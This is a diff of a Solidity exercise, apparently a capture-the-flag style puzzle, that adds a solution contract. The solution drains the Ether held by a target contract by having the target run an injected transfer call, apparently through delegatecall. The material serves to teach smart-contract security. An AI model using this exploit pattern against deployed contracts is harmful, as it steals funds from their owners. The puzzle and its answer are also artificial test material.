@@ -6,14 +6,25 @@ import {console} from "forge-std/console.sol";
 contract GetEther {
     // write any code you like inside this contract, but only this contract
     // get the Ether from the HasEther contract. You may not modify the test
-    
+
     function getEther(HasEther hasEther) external {
         //...
+
+        bytes memory data = abi.encodeWithSignature(
+            "transfer(address)",
+            address(this)
+        );
+        hasEther.action(address(this), data);
     }
+
+    function transfer(address to) external {
+        to.call{value: address(this).balance}("");
+    }
+
+    receive() external payable {}
 }
 
 contract HasEther {
-
     error NotEnoughEther();
 
     constructor() payable {
